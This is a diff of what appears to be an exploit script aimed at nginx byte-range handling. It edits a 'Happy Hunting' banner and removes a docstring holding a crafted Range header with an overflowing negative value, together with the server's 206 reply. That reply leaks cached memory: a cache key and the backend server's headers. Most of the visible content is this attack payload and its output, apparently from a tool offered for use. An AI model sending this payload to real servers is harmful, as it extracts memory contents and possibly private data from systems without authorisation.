@@ -16,7 +16,7 @@ print ('''%s   _|_|_|                                          _|
        _|  _|        _|    _|  _|    _|  _|    _|  _|  _|    _|  _|    _|  
  _|_|_|      _|_|_|    _|_|_|  _|    _|    _|_|_|  _|  _|    _|  _|    _|  
                                                _|                          
-  - https://github.com/SouravSec            _|_|         ::Happy Hunting''' % red)
+  - https://github.com/SouravSec             _|_|        ::Happy Hunting''' % red)
 print ('''%s ''' % ENDC)                                            
 
 # finsh banner 
@@ -61,38 +61,3 @@ if __name__ == '__main__':
     exploit(url)
 
 
-"""
-GET /proxy/demo.png HTTP/1.1
-Accept-Encoding: identity
-Range: bytes=-17208,-9223372036854758792
-Host: 127.0.0.1:8000
-Connection: close
-User-Agent: Python-urllib/2.7
-
-HTTP/1.1 206 Partial Content
-Server: nginx/1.13.1
-Date: Mon, 14 Aug 2017 05:53:54 GMT
-Content-Type: multipart/byteranges; boundary=00000000000000000002
-Connection: close
-Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
-ETag: "40c9-5547a060fdf00"
-X-Proxy-Cache: HIT
-
-
---00000000000000000002
-Content-Type: image/png
-Content-Range: bytes -623-16584/16585
-
-.......<.Y......................lY....r:.Y.....@.`..v.q.."40c9-5547a060fdf00".................................................................................................................................................................................................................................................................
-KEY: httpGET127.0.0.1/proxy/demo.png
-HTTP/1.1 200 OK
-Date: Mon, 14 Aug 2017 05:51:46 GMT
-Server: Apache/2.4.25 (Debian)
-Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
-ETag: "40c9-5547a060fdf00"
-Accept-Ranges: bytes
-Content-Length: 16585
-Connection: close
-Content-Type: image/png
-
-"""
